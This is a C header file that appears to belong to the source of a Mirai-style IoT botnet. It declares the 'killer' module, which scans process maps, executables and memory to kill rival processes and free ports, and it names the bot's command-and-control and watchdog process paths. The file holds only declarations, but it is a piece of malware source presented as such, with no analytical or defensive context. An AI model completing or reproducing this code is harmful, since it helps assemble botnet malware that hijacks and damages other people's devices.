#ifdef KILLER
#pragma once

#include "includes.h"

#define KILLER_MIN_PID 400
#define KILLER_RESTART_SCAN_TIME 80


void hito_killer(void);
void killer_kill(void);
BOOL killer_kill_by_port(port_t);

// * cnc path *
extern int main_pid;
extern char* main_realpath;
extern int main_realpath_len;
// * dog path *
extern int dog_pid;
extern char* dog_realpath;
extern int dog_realpath_len;

extern int killer_no_kill;

static BOOL maps_scan_match(char *);
static BOOL exe_match(char *);
static BOOL mem_exists(char *, int, char *, int);
#endif
